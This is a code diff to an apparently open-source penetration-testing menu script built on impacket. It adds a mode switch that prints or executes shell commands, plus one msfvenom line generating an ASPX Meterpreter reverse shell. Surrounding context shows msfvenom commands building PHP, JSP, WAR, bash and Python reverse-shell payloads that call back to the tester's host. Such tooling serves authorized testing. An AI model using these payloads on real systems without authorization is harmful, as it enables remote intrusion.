@@ -41,6 +41,19 @@ from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
+# Details : Load additional xParameter
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------
+
+if len(sys.argv) < 2:
+   xParameter = ""
+else:
+   xParameter = sys.argv[1]
+
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
 # Details : Create functional subroutines called from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -161,16 +174,24 @@ def remotCOM(variable):
    if proxyChains == 1:
       print("[i] Proxychains enabled...")
       variable = "proxychains4 " + variable
-   if bugHunt == 1:
+   if xParameter == "bughunt":
       print(colored(variable, colour5))
-   os.system(variable)
+      os.system(variable)
+   if xParameter == "commandsonly":
+      print(colored(variable, colour5))
+   if xParameter == "":
+      os.system(variable)   
    return
    
 def localCOM(variable):
-   if bugHunt == 1:
+   if xParameter == "bughunt":
       print(colored(variable, colour5))
-   os.system(variable)
-   return 
+      os.system(variable)
+   if xParameter == "commandsonly":
+      print(colored(variable, colour5))
+   if xParameter == "":
+      os.system(variable)
+   return
  
 def prompt():
    null = input("\nPress ENTER to continue...")
@@ -790,7 +811,6 @@ if os.geteuid() != 0:
    print("\n[*] Please run this python3 script as root...")
    exit(1)
 else:
-   bugHunt = 0  
    proxyChains = 0
    menuName = "ProxyChains"
     
@@ -3078,6 +3098,7 @@ while True:
          localCOM("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/php_reverse_php.php >> arsenal.tmp 2>&1")
          localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/jajava_jsp_shell_reverse_tcp.jsp >> arsenal.tmp 2>&1")
          localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + explDir + "/windows_meterpreter_reverse_tcp.asp >> arsenal.tmp 2>&1")
+         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f aspx   -o " + explDir + "/windows_meterpreter_reverse_tcp.aspx >> arsenal.tmp 2>&1")
          localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + explDir + "/java_jsp_shell_reverse_tcp.war >> arsenal.tmp 2>&1")
          localCOM("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_bash.sh >> arsenal.tmp 2>&1")
          localCOM("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_python.py >> arsenal.tmp 2>&1")
